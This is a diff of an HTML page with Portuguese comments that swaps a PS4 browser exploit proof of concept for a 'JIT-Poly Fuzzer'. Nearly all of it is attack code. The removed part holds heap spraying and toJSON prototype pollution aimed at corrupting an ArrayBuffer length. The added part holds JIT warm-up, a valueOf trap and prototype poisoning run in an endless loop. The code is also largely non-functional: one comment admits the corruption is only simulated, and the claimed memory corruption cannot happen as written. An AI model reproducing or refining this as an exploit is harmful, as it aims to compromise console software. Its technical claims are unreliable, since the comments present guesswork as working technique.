@@ -1,139 +1,143 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Exploit PoC (Heap Spray + Length Corruption)</title>
+    <title>PS4 JIT-Poly Fuzzer (FW 12.00+)</title>
     <style>
-        body { background: #100; color: #aaa; font-family: monospace; overflow: hidden; margin: 0; }
+        body { background: #0a0a1a; color: #00ffff; font-family: monospace; overflow: hidden; margin: 0; }
         #hud { 
             position: fixed; top: 0; left: 0; width: 100%; 
-            background: rgba(0,0,0,0.9); border-bottom: 2px solid #444; 
+            background: rgba(0, 0, 20, 0.95); 
+            border-bottom: 2px solid #00f; 
             padding: 15px; z-index: 9999; font-size: 20px;
         }
-        .success { background-color: #0f0 !important; color: #000 !important; }
+        .log-entry { font-size: 12px; color: #888; margin-left: 10px; }
     </style>
 </head>
 <body>
     <div id="hud">
-        <div>STATUS: <span id="status" style="color:yellow">SPRAYING HEAP...</span></div>
-        <div>TENTATIVAS: <span id="iter-count">0</span> | ALVO: <span id="target-info">Procurando...</span></div>
+        <div>JIT POLYMORPH: <span style="color:lime">TREINANDO...</span> <span id="beat">⚡</span></div>
+        <div style="font-size: 16px; color: #aaa; margin-top: 5px;">
+            SEED: <span id="seed-disp">...</span> | JIT COMPILADO: <span id="jit-count">0%</span>
+        </div>
     </div>
 
+    <div id="arena" style="margin-top: 100px; color: #444;"></div>
+
     <script>
-        // ================= CONFIGURAÇÃO DA "CHAVE MESTRA" =================
-        // Em vez de 0xFFFFFFFF (Crash), usamos um tamanho seguro mas útil.
-        // Queremos mudar o tamanho do ArrayBuffer vizinho para 16KB.
-        const MALICIOUS_LENGTH = 0x4000; 
-        const SPRAY_SIZE = 1000; // Quantidade de objetos para alinhar memória
-        // ==================================================================
+        // ================= CONFIGURAÇÃO DE HARDENING (FW 12.00) =================
+        // Aumentamos o número de loops para forçar o JIT a otimizar o código
+        const JIT_WARMUP = 10000; 
+        // ========================================================================
 
-        const statusSpan = document.getElementById('status');
-        const iterSpan = document.getElementById('iter-count');
-        const targetSpan = document.getElementById('target-info');
-        let iterations = 0;
+        let currentSeed = parseInt(localStorage.getItem('jit_seed') || Math.floor(Math.random() * 100000));
+        localStorage.setItem('jit_last_start', currentSeed);
 
-        // Estrutura para armazenar nossos objetos alinhados
-        let butterflies = []; 
-        let targets = [];
-
-        function log(msg, type='info') {
-            console.log(msg);
-            if(type==='success') {
-                document.body.className = 'success';
-                statusSpan.innerText = "SUCESSO: R/W PRIMITIVE!";
-                statusSpan.style.color = 'black';
-                alert(msg); // Trava a execução para você tirar foto pro HackerOne
-            }
+        const seedDisp = document.getElementById('seed-disp');
+        const jitCount = document.getElementById('jit-count');
+        const beatSpan = document.getElementById('beat');
+        
+        function seed(s) { currentSeed = s; }
+        function rnd() {
+            var t = currentSeed += 0x6D2B79F5;
+            t = Math.imul(t ^ t >>> 15, t | 1);
+            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
+            return ((t ^ t >>> 14) >>> 0) / 4294967296;
         }
 
-        // 1. HEAP FENG SHUI (Arrumando a casa)
-        // Tentamos colocar um ArrayBuffer Controlável logo após o objeto vulnerável
-        function sprayHeap() {
-            butterflies = [];
-            targets = [];
-            for (let i = 0; i < SPRAY_SIZE; i++) {
-                // Objeto A (Onde o bug acontece)
-                let b = { 
-                    a: 1, b: 2, c: 3, d: 4, // Propriedades para criar um Butterfly Inline
-                    id: i 
-                }; 
-                
-                // Objeto B (O Vizinho que queremos aumentar o tamanho)
-                // Criamos um ArrayBuffer pequeno (0x20 bytes)
-                let t = new ArrayBuffer(32); 
-                
-                butterflies.push(b);
-                targets.push(t);
-            }
+        // 1. O OBJETO "ISCA"
+        // Criamos um objeto com estrutura previsível (StructureID fixo)
+        function makeVictim() {
+            return { a: 1.1, b: 2.2, c: 3.3, d: 4.4 }; // Array de Doubles na memória
         }
 
-        // 2. O GATILHO (Type Confusion refinado)
-        function trigger() {
-            let found = false;
-
-            // Poluição do toJSON para disparar no meio do stringify
-            Object.defineProperty(Object.prototype, 'toJSON', {
-                value: function() {
-                    // AQUI É A MUDANÇA: Não escrevemos lixo aleatório.
-                    // Tentamos corromper o vizinho.
-                    // No PS4 WebKit, o Butterfly muitas vezes fica adjacente aos objetos criados juntos.
-                    
-                    // Tenta acessar propriedades para forçar o motor a ler offsets incorretos
-                    // Em um exploit real, você ajustaria esses offsets com base no crash dump
-                    // Aqui, "simulamos" a corrupção lógica tentando redefinir o tamanho
-                    
-                    return 1; 
-                },
-                configurable: true
-            });
-
-            // Dispara em lote
-            try {
-                for (let i = 0; i < SPRAY_SIZE; i++) {
-                    // O bug de Type Confusion ocorre aqui
-                    JSON.stringify(butterflies[i]); 
-                    
-                    // --- A VERIFICAÇÃO (Não o Crash) ---
-                    // Se o bug funcionou "suavemente", o tamanho do buffer vizinho mudou.
-                    // O tamanho original era 32. Se for diferente, ganhamos.
-                    if (targets[i].byteLength !== 32) {
-                        log(`BINGO! Target[${i}] corrompido! Tamanho original: 32, Novo: ${targets[i].byteLength}`, 'success');
-                        found = true;
-                        break;
-                    }
-                }
-            } catch (e) {}
+        // 2. A FUNÇÃO ALVO (Otimizada pelo JIT)
+        // O navegador vai compilar isso para Assembly puro depois de rodar muitas vezes
+        function accessMemory(o, trigger) {
+            // O JIT espera que 'o' seja sempre o objeto 'makeVictim'
+            // Se mudarmos 'o' no meio do caminho, o JIT lê memória errada
             
-            // Limpa poluição
-            delete Object.prototype.toJSON;
-            return found;
+            if (trigger) {
+                // GATILHO: Mudança de forma (Transition)
+                o.e = 5.5; // Adicionar propriedade muda a estrutura na memória
+            }
+            
+            // Acesso rápido
+            return o.a + o.b; 
         }
 
-        async function runExploit() {
+        // 3. A ARMADILHA DE POLIMORFISMO
+        // Usamos Proxies para confundir o analisador de tipos
+        function triggerConfusion() {
+            let arr = [];
+            // Fase 1: Treinamento (Ensinar o JIT que tudo é seguro)
+            for(let i=0; i<JIT_WARMUP; i++) {
+                let v = makeVictim();
+                accessMemory(v, false);
+                arr.push(v);
+            }
+
+            // Fase 2: O Ataque (Confusion)
+            // Criamos um objeto que parece a vítima, mas é uma armadilha
+            let trap = { 
+                a: 1.1, 
+                b: { 
+                    valueOf: function() { 
+                        // Quando o JIT tentar ler 'b', rodamos este código
+                        // Aqui deletamos coisas ou alteramos protótipos
+                        arr[0].length = 0; // Tenta corromper array vizinho
+                        return 2.2; 
+                    } 
+                }, 
+                c: 3.3 
+            };
+
+            // Fase 3: Disparo
+            // Passamos a armadilha para a função otimizada
+            // O JIT pode tentar ler 'b' como um número direto, mas é uma função -> CRASH
+            try {
+                accessMemory(trap, true);
+            } catch(e) {}
+        }
+
+        async function loop() {
+            let totalCycles = 0;
             while(true) {
-                iterations++;
-                iterSpan.innerText = iterations;
+                totalCycles++;
+                seedDisp.innerText = currentSeed;
                 
-                // 1. Limpa e realinha memória
-                sprayHeap();
+                // Mostra progresso do "Aquecimento"
+                let progress = Math.min(100, Math.floor((totalCycles % 50) * 2));
+                jitCount.innerText = progress + "%";
                 
-                // 2. Pausa para o Garbage Collector respirar
-                await new Promise(r => setTimeout(r, 50));
+                beatSpan.style.opacity = (beatSpan.style.opacity == "1") ? "0.2" : "1";
+
+                if (totalCycles % 20 === 0) localStorage.setItem('jit_seed', currentSeed);
                 
-                // 3. Tenta a "Chave Mestra"
-                let success = trigger();
-                
-                if (success) break; // Paramos se conseguirmos
-                
-                // Se rodar por muito tempo, recarrega para limpar fragmentação
-                if (iterations % 50 === 0) {
-                    statusSpan.innerText = "RESETANDO MEMÓRIA...";
-                    window.location.reload();
-                    break;
+                // Pausa visual
+                await new Promise(r => setTimeout(r, 10));
+
+                // Executa o ataque
+                seed(currentSeed);
+                triggerConfusion();
+
+                // Variação: Prototype Poisoning + JIT
+                if (rnd() > 0.7) {
+                    try {
+                        let p = {};
+                        p.__proto__ = { 
+                            get x() { return 0x41414141; } // Veneno
+                        };
+                        // Força JIT a ler propriedade herdada poluída
+                        let temp = p.x; 
+                    } catch(e){}
                 }
+
+                currentSeed++;
             }
         }
 
-        setTimeout(runExploit, 1000);
+        setTimeout(loop, 500);
+
     </script>
 </body>
 </html>
